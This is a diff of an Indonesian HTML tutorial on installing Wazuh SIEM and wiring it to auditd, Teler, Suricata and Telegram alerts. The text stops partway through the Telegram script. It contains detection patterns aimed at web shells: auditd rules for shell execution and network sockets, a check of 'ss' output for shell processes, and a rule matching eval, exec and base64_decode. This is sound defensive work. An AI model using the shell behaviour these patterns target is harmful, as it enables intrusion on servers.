@@ -1,163 +1,135 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instalasi Wazuh - Panduan SIEM</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Panduan Wazuh SIEM</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body {
-      font-family: 'Inter', sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f9fafb;
-      color: #111827;
-      line-height: 1.7;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f8f9fa;
     }
-    header {
-      background: #1e3a8a;
-      color: white;
+    .content {
+      max-width: 960px;
+      margin: 0 auto;
       padding: 2rem 1rem;
-      text-align: center;
     }
-    main {
-      max-width: 900px;
-      margin: 2rem auto;
-      padding: 1rem 2rem;
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-    }
-    h1, h2 {
-      color: #1e40af;
-    }
-    details {
-      margin: 1rem 0;
-      border: 1px solid #e5e7eb;
-      border-radius: 6px;
-      padding: 0.8rem 1rem;
-      background: #f9fafb;
-    }
-    summary {
-      cursor: pointer;
-      font-weight: 600;
-      font-size: 1.1rem;
-      color: #111827;
-    }
-    summary:hover {
+    h2 {
+      margin-top: 2rem;
       color: #1d4ed8;
     }
     pre {
-      background: #f3f4f6;
+      background-color: #f1f3f5;
       padding: 1rem;
-      overflow-x: auto;
-      border-left: 4px solid #3b82f6;
+      border-left: 4px solid #0d6efd;
       border-radius: 4px;
+      overflow-x: auto;
+    }
+    img {
+      border: 1px solid #dee2e6;
+      border-radius: 5px;
+      margin: 1rem 0;
+      max-width: 100%;
+      height: auto;
     }
     code {
-      font-family: monospace;
+      color: #d63384;
     }
   </style>
 </head>
 <body>
-  <header>
-    <h1>Panduan Instalasi Wazuh SIEM</h1>
-    <p>Langkah-langkah instalasi server dan agent untuk sistem keamanan Wazuh</p>
-  </header>
 
-  <main>
+  <nav class="navbar navbar-light bg-white border-bottom shadow-sm mb-4">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-primary" href="#">Panduan Wazuh SIEM</a>
+    </div>
+  </nav>
+
+  <div class="content container bg-white shadow-sm p-4 rounded">
+
+    <h1 class="mb-4">Instalasi dan Konfigurasi Wazuh SIEM</h1>
+
     <h2>4.2 Instalasi Wazuh</h2>
+    <p><strong>Wazuh Server</strong> adalah komponen inti yang mengelola data dari endpoint.</p>
+    <h5>a. Instalasi Wazuh Server</h5>
+    <ol>
+      <li>Instal curl:
+        <pre><code>sudo apt install curl -y</code></pre>
+      </li>
+      <li>Unduh dan jalankan installer:
+        <pre><code>curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a</code></pre>
+      </li>
+      <li>Catat informasi login dari output <code>INFO: — Summary —</code></li>
+      <li>Akses dashboard:
+        <pre><code>https://&lt;wazuh-dashboard-ip&gt;</code></pre>
+      </li>
+    </ol>
 
-    <details open>
-      <summary><strong>a. Instalasi Wazuh Server</strong></summary>
-      <p><strong>Wazuh Server</strong> adalah komponen utama yang mengelola, menganalisis, dan menyimpan data dari endpoint.</p>
-
-      <ol>
-        <li><strong>Instalasi Curl</strong>
-          <pre><code>sudo apt install curl -y</code></pre>
-        </li>
-        <li><strong>Unduh dan Jalankan Skrip Instalasi Wazuh</strong>
-          <pre><code>curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a</code></pre>
-        </li>
-        <li><strong>Catat Informasi Login</strong>
-          <p>Setelah instalasi selesai, catat username dan password dari output <code>INFO: — Summary —</code>.</p>
-        </li>
-        <li><strong>Akses Wazuh Dashboard</strong>
-          <pre><code>https://&lt;wazuh-dashboard-ip&gt;</code></pre>
-          <p>Gantilah <code>&lt;wazuh-dashboard-ip&gt;</code> dengan alamat IP server Anda.</p>
-        </li>
-      </ol>
-    </details>
-
-    <details>
-      <summary><strong>b. Instalasi Wazuh Agent</strong></summary>
-      <p><strong>Wazuh Agent</strong> diinstal pada endpoint seperti server/desktop yang akan dikirim datanya ke server utama.</p>
-
-      <ol>
-        <li><strong>Tambahkan Repositori Wazuh</strong>
-          <pre><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring \
---keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
-
-echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | \
-tee -a /etc/apt/sources.list.d/wazuh.list
-
+    <h5>b. Instalasi Wazuh Agent</h5>
+    <ol>
+      <li>Tambahkan repo:
+        <pre><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import
+chmod 644 /usr/share/keyrings/wazuh.gpg
+echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
 apt-get update</code></pre>
-        </li>
-        <li><strong>Instalasi Wazuh Agent</strong>
-          <pre><code>WAZUH_MANAGER="&lt;SERVER_IP&gt;" apt-get install wazuh-agent</code></pre>
-          <p>Gantilah <code>&lt;SERVER_IP&gt;</code> dengan IP Wazuh Server.</p>
-        </li>
-        <li><strong>Jalankan Wazuh Agent</strong>
-          <pre><code>systemctl daemon-reload
+      </li>
+      <li>Install agent:
+        <pre><code>WAZUH_MANAGER="&lt;SERVER_IP&gt;" apt-get install wazuh-agent</code></pre>
+      </li>
+      <li>Aktifkan agent:
+        <pre><code>systemctl daemon-reload
 systemctl enable wazuh-agent
 systemctl start wazuh-agent</code></pre>
-        </li>
-      </ol>
-    </details>
-
+      </li>
+    </ol>
     <h2>4.3 Konfigurasi Wazuh</h2>
 
-<details open>
-  <summary><strong>a. File Integrity Monitoring (FIM) pada Wazuh</strong></summary>
+<h5>a. File Integrity Monitoring (FIM)</h5>
+<p>
+  File Integrity Monitoring (FIM) adalah fitur penting Wazuh untuk mendeteksi perubahan tidak sah pada file sistem, konfigurasi, atau file penting lainnya yang bisa menunjukkan aktivitas mencurigakan atau serangan.
+</p>
 
-  <p><strong>FIM</strong> bertugas memantau perubahan file dan direktori penting untuk mencegah aktivitas mencurigakan atau peretasan. Berikut tahapan konfigurasi lengkapnya:</p>
-
-  <ol>
-    <li><strong>Instalasi Apache Web Server & PHP</strong>
-      <pre><code>sudo apt update
+<ol>
+  <li><strong>Instalasi Apache dan PHP</strong>
+    <pre><code>sudo apt update
 sudo apt install apache2
 sudo apt install --no-install-recommends php</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Verifikasi Apache</strong>
-      <p>Buka <code>http://&lt;AGENT_IP&gt;</code> dari browser untuk melihat halaman default Apache.</p>
-    </li>
+  <li><strong>Verifikasi Instalasi</strong>
+    <p>Buka browser dan akses:</p>
+    <pre><code>http://&lt;AGENT_IP&gt;</code></pre>
+    <p>Untuk memastikan Apache berjalan, pastikan halaman default Apache muncul.</p>
+  </li>
 
-    <li><strong>Ubah Konfigurasi Ossec untuk FIM</strong>
-      <pre><code>&lt;directories realtime="yes" check_all="yes" report_changes="yes"&gt;/var/www/html&lt;/directories&gt;</code></pre>
-      <p>Edit pada file <code>/var/ossec/etc/ossec.conf</code> di bagian <code>&lt;syscheck&gt;</code>.</p>
-    </li>
+  <li><strong>Ubah Konfigurasi FIM di <code>ossec.conf</code></strong>
+    <p>Edit file <code>/var/ossec/etc/ossec.conf</code> pada endpoint agent dan tambahkan direktori untuk dimonitor:</p>
+    <pre><code>&lt;directories realtime="yes" check_all="yes" report_changes="yes"&gt;/var/www/html&lt;/directories&gt;</code></pre>
+  </li>
 
-    <li><strong>Instalasi auditd</strong>
-      <pre><code>sudo apt update
+  <li><strong>Instal <code>auditd</code></strong>
+    <pre><code>sudo apt update
 sudo apt install auditd</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Forward log auditd ke Wazuh</strong>
-      <pre><code>&lt;ossec_config&gt;
+  <li><strong>Konfigurasi log <code>auditd</code> untuk dikirim ke Wazuh</strong>
+    <pre><code>&lt;ossec_config&gt;
   &lt;localfile&gt;
     &lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;
     &lt;log_format&gt;audit&lt;/log_format&gt;
   &lt;/localfile&gt;
 &lt;/ossec_config&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Temukan User ID Apache</strong>
-      <pre><code>sudo apachectl -S</code></pre>
-    </li>
+  <li><strong>Dapatkan User ID Apache</strong>
+    <pre><code>sudo apachectl -S</code></pre>
+    <p>Cari informasi user ID dari output untuk digunakan pada konfigurasi <code>audit.rules</code>.</p>
+  </li>
 
-    <li><strong>Tambahkan Auditd Rules</strong>
-      <pre><code># Ganti &lt;USER_ID&gt; sesuai hasil sebelumnya
+  <li><strong>Konfigurasi <code>/etc/audit/rules.d/audit.rules</code></strong>
+    <pre><code># Ganti &lt;USER_ID&gt; sesuai hasil sebelumnya
+
 -a always,exit -F arch=b32 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec
 -a always,exit -F arch=b64 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec
 
@@ -165,221 +137,160 @@ sudo apt install auditd</code></pre>
 -a always,exit -F arch=b64 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect
 -a always,exit -F arch=b32 -S socket -F a0=10 -F euid=&lt;USER_ID&gt; -k webshell_net_connect
 -a always,exit -F arch=b32 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Monitoring Command via Shell</strong>
-      <pre><code>&lt;ossec_config&gt;
+  <li><strong>Monitoring Perintah Shell</strong>
+    <pre><code>&lt;ossec_config&gt;
   &lt;localfile&gt;
     &lt;log_format&gt;full_command&lt;/log_format&gt;
-    &lt;command&gt;ss -nputw | egrep '"sh"|"bash"|"csh"|"ksh"|"zsh"' | awk '{{ print $5 "|" $6 }}'&lt;/command&gt;
+    &lt;command&gt;ss -nputw | egrep '"sh"|"bash"|"csh"|"ksh"|"zsh"' | awk '{ print $5 "|" $6 }'&lt;/command&gt;
     &lt;alias&gt;webshell connections&lt;/alias&gt;
     &lt;frequency&gt;120&lt;/frequency&gt;
   &lt;/localfile&gt;
 &lt;/ossec_config&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Restart Auditd & Wazuh Agent</strong>
-      <pre><code>sudo systemctl restart auditd
+  <li><strong>Restart <code>wazuh-agent</code> dan <code>auditd</code></strong>
+    <pre><code>sudo systemctl restart auditd
 sudo systemctl restart wazuh-agent</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Tambahkan Custom Rules</strong>
-      <p>Buat file <code>webshell_rules.xml</code> di <code>/var/ossec/etc/rules/</code>:</p>
-      <pre><code>sudo gedit /var/ossec/etc/rules/webshell_rules.xml</code></pre>
-    </li>
-
-    <li><strong>Konfigurasi Rules PHP Webshell</strong>
-      <pre><code>&lt;group name="linux, webshell, windows,"&gt;
+  <li><strong>Tambahkan Custom Rule di Server Wazuh</strong>
+    <pre><code>sudo nano /var/ossec/etc/rules/webshell_rules.xml</code></pre>
+    <p>Masukkan rule pendeteksi pembuatan dan modifikasi file berbahaya (misalnya .php, .asp, .jsp):</p>
+    <pre><code>&lt;group name="linux, webshell,"&gt;
   &lt;rule id="100500" level="12"&gt;
     &lt;if_sid&gt;554&lt;/if_sid&gt;
-    &lt;field name="file" type="pcre2"&gt;(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$&lt;/field&gt;
-    &lt;description&gt;[File creation]: Possible web shell file created&lt;/description&gt;
+    &lt;field name="file" type="pcre2"&gt;(?i).php$|.phtml$|.jsp$&lt;/field&gt;
+    &lt;description&gt;[File creation]: Possible web shell script created&lt;/description&gt;
   &lt;/rule&gt;
-
-  &lt;rule id="100501" level="12"&gt;
-    &lt;if_sid&gt;550&lt;/if_sid&gt;
-    &lt;field name="file" type="pcre2"&gt;(?i).php$|.phtml$|.php3$|.php4$&lt;/field&gt;
-    &lt;description&gt;[File modification]: Possible web shell content added&lt;/description&gt;
-  &lt;/rule&gt;
-
-  &lt;rule id="100502" level="15"&gt;
-    &lt;if_sid&gt;100501&lt;/if_sid&gt;
-    &lt;field name="changed_content" type="pcre2"&gt;(?i)eval|exec|base64_decode|system&lt;/field&gt;
-    &lt;description&gt;[File Modification]: Web shell detected&lt;/description&gt;
-  &lt;/rule&gt;
+  ...
 &lt;/group&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Rule Tambahan: Command Execution (Linux & Windows)</strong>
-      <p>Masukkan rules tambahan untuk mendeteksi eksekusi shell dan koneksi jaringan.</p>
-    </li>
-
-    <li><strong>Tambahkan Decoder</strong>
-      <p>Di <code>/var/ossec/etc/decoders/local_decoder.xml</code></p>
-      <pre><code>&lt;decoder name="network-traffic-child"&gt;
+  <li><strong>Tambahkan Decoder</strong> ke file <code>local_decoder.xml</code>
+    <pre><code>&lt;decoder name="network-traffic-child"&gt;
   &lt;parent&gt;ossec&lt;/parent&gt;
   &lt;prematch&gt;^output: 'webshell connections':&lt;/prematch&gt;
   &lt;regex&gt;(\d+.\d+.\d+.\d+):(\d+)\|(\d+.\d+.\d+.\d+):(\d+)&lt;/regex&gt;
   &lt;order&gt;local_ip, local_port, foreign_ip, foreign_port&lt;/order&gt;
 &lt;/decoder&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Rules Koneksi Jaringan dari Script</strong>
-      <pre><code>&lt;group name="linux, webshell,"&gt;
-  &lt;rule id="100510" level="12"&gt;
-    &lt;decoded_as&gt;ossec&lt;/decoded_as&gt;
-    &lt;match&gt;ossec: output: 'webshell connections'&lt;/match&gt;
-    &lt;description&gt;Script attempting network connection&lt;/description&gt;
-  &lt;/rule&gt;
-&lt;/group&gt;</code></pre>
-    </li>
+  <li><strong>Restart Wazuh Manager</strong>
+    <pre><code>sudo systemctl restart wazuh-manager</code></pre>
+  </li>
+</ol>
+    <h2>4.3b Integrasi Wazuh dengan Teler</h2>
+<p>
+  <strong>Teler</strong> adalah HTTP Intrusion Detection System (IDS) ringan yang mendeteksi berbagai serangan web seperti HTML injection, file upload, dan directory traversal. Integrasi ini memungkinkan log teler dimonitor oleh Wazuh.
+</p>
 
-    <li><strong>Restart Wazuh Manager</strong>
-      <pre><code>sudo systemctl restart wazuh-manager</code></pre>
-    </li>
-  </ol>
-</details>
-    <h3>b. Integrasi Wazuh dengan Teler</h3>
-
-<details>
-  <summary><strong>Integrasi Teler - HTTP Intrusion Detection</strong></summary>
-
-  <p><strong>Teler</strong> adalah IDS HTTP ringan yang membantu mendeteksi eksploitasi web seperti injeksi HTML, directory traversal, dan serangan upload file. Berikut adalah tahapan integrasinya:</p>
-
-  <ol>
-    <li><strong>Download dan Ekstrak Teler</strong>
-      <pre><code>wget https://github.com/kitabisa/teler/releases/download/v2.0.0-rc.3/teler_2.0.0-rc.3_linux_amd64.tar.gz
+<ol>
+  <li><strong>Unduh dan Ekstrak Teler</strong>
+    <pre><code>wget https://github.com/kitabisa/teler/releases/download/v2.0.0-rc.3/teler_2.0.0-rc.3_linux_amd64.tar.gz
 tar -xvzf teler_2.0.0-rc.3_linux_amd64.tar.gz</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Download Template Konfigurasi</strong>
-      <pre><code>wget https://github.com/kitabisa/teler/blob/v2/teler.example.yaml</code></pre>
-    </li>
+  <li><strong>Download Template Konfigurasi</strong>
+    <pre><code>wget https://github.com/kitabisa/teler/blob/v2/teler.example.yaml</code></pre>
+  </li>
 
-    <li><strong>Rename File Konfigurasi</strong>
-      <pre><code>mv teler.example.yaml teler.yaml</code></pre>
-    </li>
+  <li><strong>Ubah Nama File</strong>
+    <pre><code>mv teler.example.yaml teler.yaml</code></pre>
+  </li>
 
-    <li><strong>Edit <code>log_format</code> di <code>teler.yaml</code></strong>
-      <pre><code>log_format: |
-  $remote_addr - $remote_user [$time_local] "$request_method $request_uri $request_protocol" $status $body_bytes_sent "$http_referer" "$http_user_agent"</code></pre>
-    </li>
+  <li><strong>Edit File <code>teler.yaml</code></strong>
+    <p>Isi bagian:</p>
+    <pre><code>log_format: |
+  $remote_addr - $remote_user [$time_local] "$request_method $request_uri $request_protocol" $status $body_bytes_sent "$http_referer" "$http_user_agent"
 
-    <li><strong>Edit <code>logs</code> di <code>teler.yaml</code></strong>
-      <pre><code>logs:
+logs:
   active: true
   json: true
   path: /var/log/teler/output.log</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Buat Direktori Log</strong>
-      <pre><code>cd /var/log
-sudo mkdir teler</code></pre>
-    </li>
+  <li><strong>Buat Folder Log</strong>
+    <pre><code>sudo mkdir /var/log/teler</code></pre>
+  </li>
 
-    <li><strong>Tambahkan Konfigurasi di Wazuh Agent</strong>
-      <pre><code>&lt;localfile&gt;
+  <li><strong>Tambahkan Konfigurasi ke Wazuh Agent</strong>
+    <pre><code>&lt;localfile&gt;
   &lt;log_format&gt;syslog&lt;/log_format&gt;
   &lt;location&gt;/var/log/teler/output.log&lt;/location&gt;
 &lt;/localfile&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Restart Wazuh Agent</strong>
-      <pre><code>systemctl restart wazuh-agent</code></pre>
-    </li>
+  <li><strong>Restart Wazuh Agent</strong>
+    <pre><code>sudo systemctl restart wazuh-agent</code></pre>
+  </li>
 
-    <li><strong>Jalankan Teler</strong>
-      <pre><code>sudo tail -f /var/log/apache2/access.log | ./teler -c teler.yaml</code></pre>
-    </li>
+  <li><strong>Jalankan Teler</strong>
+    <pre><code>sudo tail -f /var/log/apache2/access.log | ./teler -c teler.yaml</code></pre>
+  </li>
 
-    <li><strong>Tambahkan Custom Rules ke <code>local_rules.xml</code></strong>
-      <pre><code>&lt;group name="teler,"&gt;
+  <li><strong>Tambahkan Rules Teler di Wazuh Server</strong>
+    <p>Edit <code>/var/ossec/etc/rules/local_rules.xml</code> dan tambahkan:</p>
+    <pre><code>&lt;group name="teler,"&gt;
   &lt;rule id="100012" level="10"&gt;
     &lt;decoded_as&gt;json&lt;/decoded_as&gt;
-    &lt;field name="category" type="pcre2"&gt;Common Web Attack(: .*)?|CVE-[0-9]{4}-[0-9]{4,7}&lt;/field&gt;
-    &lt;field name="request_uri" type="pcre2"&gt;\D.+|-&lt;/field&gt;
-    &lt;field name="remote_addr" type="pcre2"&gt;\d+.\d+.\d+.\d+|::1&lt;/field&gt;
-    &lt;mitre&gt;
-      &lt;id&gt;T1210&lt;/id&gt;
-    &lt;/mitre&gt;
-    &lt;description&gt;teler detected $(category) against resource $(request_uri) from $(remote_addr)&lt;/description&gt;
+    &lt;field name="category"&gt;Common Web Attack(: .*)?|CVE-[0-9]{4}-[0-9]{4,7}&lt;/field&gt;
+    &lt;description&gt;teler detected $(category) against $(request_uri)&lt;/description&gt;
   &lt;/rule&gt;
-
-  &lt;rule id="100013" level="10"&gt;
-    &lt;decoded_as&gt;json&lt;/decoded_as&gt;
-    &lt;field name="category" type="pcre2"&gt;Bad (IP Address|Referrer|Crawler)&lt;/field&gt;
-    &lt;field name="request_uri" type="pcre2"&gt;\D.+|-&lt;/field&gt;
-    &lt;field name="remote_addr" type="pcre2"&gt;\d+.\d+.\d+.\d+|::1&lt;/field&gt;
-    &lt;mitre&gt;
-      &lt;id&gt;T1590&lt;/id&gt;
-    &lt;/mitre&gt;
-    &lt;description&gt;teler detected $(category) against resource $(request_uri) from $(remote_addr)&lt;/description&gt;
-  &lt;/rule&gt;
-
-  &lt;rule id="100014" level="10"&gt;
-    &lt;decoded_as&gt;json&lt;/decoded_as&gt;
-    &lt;field name="category" type="pcre2"&gt;Directory Bruteforce&lt;/field&gt;
-    &lt;field name="request_uri" type="pcre2"&gt;\D.+|-&lt;/field&gt;
-    &lt;field name="remote_addr" type="pcre2"&gt;\d+.\d+.\d+.\d+|::1&lt;/field&gt;
-    &lt;mitre&gt;
-      &lt;id&gt;T1595&lt;/id&gt;
-    &lt;/mitre&gt;
-    &lt;description&gt;teler detected $(category) against resource $(request_uri) from $(remote_addr)&lt;/description&gt;
-  &lt;/rule&gt;
+  ...
 &lt;/group&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Restart Wazuh Manager</strong>
-      <pre><code>systemctl restart wazuh-manager</code></pre>
-    </li>
-  </ol>
-</details>
-<h3>c. Integrasi Wazuh dengan Suricata</h3>
+  <li><strong>Restart Wazuh Manager</strong>
+    <pre><code>sudo systemctl restart wazuh-manager</code></pre>
+  </li>
+</ol>
+    <h2>4.3c Integrasi Wazuh dengan Suricata</h2>
+<p>
+  <strong>Suricata</strong> adalah sistem deteksi intrusi jaringan (NIDS) yang mampu memantau lalu lintas jaringan secara real-time. Integrasi dengan Wazuh memungkinkan korelasi log yang lebih baik.
+</p>
 
-<details>
-  <summary><strong>Integrasi Suricata - Network IDS</strong></summary>
+<ol>
+  <li><strong>Instal Suricata</strong>
+    <pre><code>sudo apt install suricata</code></pre>
+  </li>
 
-  <p><strong>Suricata</strong> adalah NIDS yang melakukan deep packet inspection, mendeteksi intrusi jaringan, dan menghasilkan log rinci. Berikut integrasi dengan Wazuh:</p>
+  <li><strong>Update Rules Suricata</strong>
+    <pre><code>sudo suricata-update</code></pre>
+  </li>
 
-  <ol>
-    <li><strong>Instalasi Suricata</strong>
-      <pre><code>sudo apt install suricata</code></pre>
-    </li>
-
-    <li><strong>Instalasi Rules</strong>
-      <pre><code>sudo suricata-update</code></pre>
-    </li>
-
-    <li><strong>Jalankan Suricata</strong>
-      <pre><code>sudo systemctl daemon-reload
+  <li><strong>Aktifkan Suricata</strong>
+    <pre><code>sudo systemctl daemon-reload
 sudo systemctl enable suricata
 sudo systemctl start suricata</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Verifikasi Apache Web Server</strong>
-      <pre><code>sudo apt update
-sudo apt install apache2
-sudo apt install --no-install-recommends php</code></pre>
-      <p>Buka <code>http://&lt;UBUNTU_IP&gt;</code> untuk verifikasi halaman default Apache.</p>
-    </li>
+  <li><strong>Verifikasi Apache</strong>
+    <pre><code>sudo apt install apache2 php</code></pre>
+    <p>Lalu akses:</p>
+    <pre><code>http://&lt;UBUNTU_IP&gt;</code></pre>
+  </li>
 
-    <li><strong>Buat Agent Group "Suricata"</strong>
-      <pre><code>sudo /var/ossec/bin/agent_groups -a -g Suricata -q
+  <li><strong>Buat Group Suricata</strong>
+    <pre><code>sudo /var/ossec/bin/agent_groups -a -g Suricata -q
 sudo /var/ossec/bin/manage_agents -l
 sudo /var/ossec/bin/agent_groups -a -i &lt;AGENT_ID&gt; -g Suricata -q</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Tambahkan Konfigurasi Wazuh Agent</strong>
-      <pre><code>&lt;agent_config&gt;
+  <li><strong>Tambahkan Konfigurasi Agent</strong>
+    <p>Edit <code>/var/ossec/etc/shared/Suricata/agent.conf</code>:</p>
+    <pre><code>&lt;agent_config&gt;
   &lt;localfile&gt;
     &lt;log_format&gt;json&lt;/log_format&gt;
     &lt;location&gt;/var/log/suricata/eve.json&lt;/location&gt;
   &lt;/localfile&gt;
 &lt;/agent_config&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Tambahkan Decoder Suricata</strong>
-      <pre><code>&lt;decoder name="json"&gt;
+  <li><strong>Tambahkan Decoder</strong>
+    <p>Ke file <code>local_decoder.xml</code>:</p>
+    <pre><code>&lt;decoder name="json"&gt;
   &lt;prematch&gt;^{\s*"&lt;/prematch&gt;
 &lt;/decoder&gt;
 
@@ -393,10 +304,11 @@ sudo /var/ossec/bin/agent_groups -a -i &lt;AGENT_ID&gt; -g Suricata -q</code></p
   &lt;parent&gt;json&lt;/parent&gt;
   &lt;plugin_decoder&gt;JSON_Decoder&lt;/plugin_decoder&gt;
 &lt;/decoder&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Tambahkan Custom Rules</strong>
-      <pre><code>&lt;group name="suricata_rules,"&gt;
+  <li><strong>Tambahkan Rule Suricata</strong>
+    <p>Edit <code>/var/ossec/etc/rules/local_rules.xml</code>:</p>
+    <pre><code>&lt;group name="suricata_rules,"&gt;
   &lt;rule id="100015" level="12"&gt;
     &lt;if_sid&gt;86600&lt;/if_sid&gt;
     &lt;field name="event_type"&gt;^alert$&lt;/field&gt;
@@ -405,16 +317,14 @@ sudo /var/ossec/bin/agent_groups -a -i &lt;AGENT_ID&gt; -g Suricata -q</code></p
     &lt;mitre&gt;&lt;id&gt;T1595&lt;/id&gt;&lt;/mitre&gt;
   &lt;/rule&gt;
 &lt;/group&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Konfigurasi Active Response Firewall</strong>
-      <pre><code>&lt;ossec_config&gt;
-  &lt;command&gt;
-    &lt;name&gt;firewall-drop&lt;/name&gt;
-    &lt;executable&gt;firewall-drop&lt;/executable&gt;
-    &lt;timeout_allowed&gt;yes&lt;/timeout_allowed&gt;
-  &lt;/command&gt;
-&lt;/ossec_config&gt;
+  <li><strong>Konfigurasi <code>firewall-drop</code></strong>
+    <pre><code>&lt;command&gt;
+  &lt;name&gt;firewall-drop&lt;/name&gt;
+  &lt;executable&gt;firewall-drop&lt;/executable&gt;
+  &lt;timeout_allowed&gt;yes&lt;/timeout_allowed&gt;
+&lt;/command&gt;
 
 &lt;active-response&gt;
   &lt;command&gt;firewall-drop&lt;/command&gt;
@@ -422,144 +332,149 @@ sudo /var/ossec/bin/agent_groups -a -i &lt;AGENT_ID&gt; -g Suricata -q</code></p
   &lt;rules_id&gt;100015&lt;/rules_id&gt;
   &lt;timeout&gt;180&lt;/timeout&gt;
 &lt;/active-response&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Restart Wazuh Manager</strong>
-      <pre><code>sudo systemctl restart wazuh-manager</code></pre>
-    </li>
-  </ol>
-</details>
-<h3>d. Integrasi Wazuh dengan Telegram</h3>
+  <li><strong>Restart Wazuh Manager</strong>
+    <pre><code>sudo systemctl restart wazuh-manager</code></pre>
+  </li>
+</ol>
+    <h2>4.3d Integrasi Wazuh dengan Telegram</h2>
 
-<details>
-  <summary><strong>Integrasi Telegram Bot untuk Alert</strong></summary>
+<p>
+  Integrasi dengan <strong>Telegram</strong> memungkinkan Anda menerima notifikasi alert dari Wazuh secara real-time melalui bot yang dikonfigurasi.
+</p>
 
-  <p>Integrasi ini memungkinkan alert dari Wazuh dikirim langsung ke grup Telegram melalui bot khusus.</p>
+<ol>
+  <li><strong>Buat Telegram Bot</strong>
+    <p>Chat dengan <code>@BotFather</code> di Telegram:</p>
+    <ul>
+      <li>Ketik <code>/start</code> lalu <code>/newbot</code></li>
+      <li>Masukkan nama dan username bot</li>
+      <li>Simpan <strong>HTTP API token</strong> yang diberikan</li>
+    </ul>
+  </li>
 
-  <ol>
-    <li><strong>Buat Telegram Bot</strong>
-      <p>Gunakan <code>@BotFather</code> di Telegram:</p>
-      <ul>
-        <li>Ketik <code>/start</code> dan <code>/newbot</code></li>
-        <li>Simpan HTTP API token</li>
-      </ul>
-    </li>
+  <li><strong>Tambahkan Bot ke Grup</strong>
+    <ul>
+      <li>Tambahkan bot ke grup Telegram Anda</li>
+      <li>Gunakan <code>@myidbot</code> dan kirim <code>/getgroupid</code> untuk mendapatkan Group ID</li>
+    </ul>
+  </li>
 
-    <li><strong>Dapatkan Group ID</strong>
-      <p>Tambahkan bot ke grup, lalu gunakan <code>@myidbot</code> dan perintah:</p>
-      <pre><code>/getgroupid</code></pre>
-    </li>
-
-    <li><strong>Install pip dan requests</strong>
-      <pre><code>sudo apt install pip -y
+  <li><strong>Instal pip dan requests</strong>
+    <pre><code>sudo apt install pip -y
 pip install requests</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Buat File <code>custom-telegram</code></strong>
-      <pre><code>sudo nano /var/ossec/integrations/custom-telegram</code></pre>
-      <p>Isi skrip shell yang memanggil skrip Python Telegram (lihat dokumentasi Wazuh).</p>
-    </li>
+  <li><strong>Buat Skrip Integrasi</strong>
+    <pre><code>sudo nano /var/ossec/integrations/custom-telegram</code></pre>
+    <p>Isi file shell:</p>
+    <pre><code>#!/bin/sh
+WPYTHON_BIN="framework/python/bin/python3"
+SCRIPT_PATH_NAME="$0"
+DIR_NAME="$(cd $(dirname ${SCRIPT_PATH_NAME}); pwd -P)"
+SCRIPT_NAME="$(basename ${SCRIPT_PATH_NAME})"
+WAZUH_PATH="$(cd ${DIR_NAME}/..; pwd)"
+PYTHON_SCRIPT="${DIR_NAME}/${SCRIPT_NAME}.py"
+${WAZUH_PATH}/${WPYTHON_BIN} ${PYTHON_SCRIPT} "$@"</code></pre>
 
-    <li><strong>Buat File <code>custom-telegram.py</code></strong>
-      <pre><code>sudo nano /var/ossec/integrations/custom-telegram.py</code></pre>
-      <p>Isi dengan script Python seperti ini:</p>
-      <pre><code>import sys, json, requests
+    <pre><code>sudo nano /var/ossec/integrations/custom-telegram.py</code></pre>
+    <p>Isi file Python:</p>
+    <pre><code>#!/usr/bin/env python
+import sys, json, requests
 
-CHAT_ID = "-82643xxxx"
-alert_json = json.loads(open(sys.argv[1]).read())
+CHAT_ID="-826434xxx"
+alert_file = open(sys.argv[1])
 hook_url = sys.argv[3]
+alert_json = json.loads(alert_file.read())
+alert_file.close()
 
-msg = {
-    'chat_id': CHAT_ID,
